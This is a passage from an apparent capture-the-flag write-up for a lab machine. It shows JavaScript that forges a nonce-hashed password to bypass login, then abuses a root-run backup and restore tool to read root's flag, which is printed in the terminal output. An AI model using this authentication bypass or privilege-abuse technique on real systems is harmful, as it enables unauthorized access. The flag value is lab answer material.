`var saltedpwd = '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a';
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('wyMIqthsnD/MzActfWKWtHMlHrgXRavLeMIapznu2+A=') + saltedpwd)).toString(CryptoJS.enc.Base64); 
console.log(noncedpwd);`
Explanation:
- The  first value is the password passphrase obtained by DB(Base64 decoded + Hex encoded)
- The second value is the *session-nonce* obtained by intercepting the login request in burpsuite.(URL decoded)
- The results of the console log is lastly URL encoded and replaced in the password field.
![dadf91efcb135189b761ed91af7e4408.png](../../../_resources/dadf91efcb135189b761ed91af7e4408.png)
This results in a authentication bypass.
![4071203ac3e30586a861fa06a1930c3b.png](../../../_resources/4071203ac3e30586a861fa06a1930c3b.png)
Now we need to use this to obtain somehow the flag, and I remember playing a CTF where I managed to get the flag by backupping and restoring it. 
This will allow me to get it, mostly because the tool have actuall root permission in order to be able to backup and restore sensitive files otherwise will be impossible.
![3ce4032d22a4b16f3f2e20e0d25b8607.png](../../../_resources/3ce4032d22a4b16f3f2e20e0d25b8607.png)
Seems like root folder is void?
![c2599708ba5cd60428aa52d6488cd6fe.png](../../../_resources/c2599708ba5cd60428aa52d6488cd6fe.png)
The it means it might be saved somewhere else? And after some manual searching seems like it is saved under **/source**?
![0430ddf7740d93c1f8c003bded789367.png](../../../_resources/0430ddf7740d93c1f8c003bded789367.png)
When we run the backup manually we can see the success:
![50cb9decc993ed70467a3cfd6bf8f00f.png](../../../_resources/50cb9decc993ed70467a3cfd6bf8f00f.png)
Now we need to restore it to the same folder aka /tmp.
![9b82b5e19cf5f02f3d883992d5ff4829.png](../../../_resources/9b82b5e19cf5f02f3d883992d5ff4829.png)
But it was failig so I gave the Marcus home folder and et voila!
`marcus@monitorsthree:/home$ cd marcus/
marcus@monitorsthree:~$ ll
total 36
drwxr-x--- 4 marcus marcus 4096 Aug 30 08:08 ./
drwxr-xr-x 3 root   root   4096 May 26 16:34 ../
lrwxrwxrwx 1 root   root      9 Aug 16 11:29 .bash_history -> /dev/null
-rw-r--r-- 1 marcus marcus  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 marcus marcus 3771 Jan  6  2022 .bashrc
drwx------ 2 marcus marcus 4096 Aug 16 11:35 .cache/
-rw-r--r-- 1 marcus marcus  807 Jan  6  2022 .profile
-rw-r--r-- 1 root   root     33 Aug 29 11:15 root.txt
drwx------ 2 marcus marcus 4096 Aug 29 11:14 .ssh/
-rw-r----- 1 root   marcus   33 Aug 29 11:15 user.txt
marcus@monitorsthree:~$ cat root.txt 
f06129e11ba7c49f64879a4a4f9ac677
`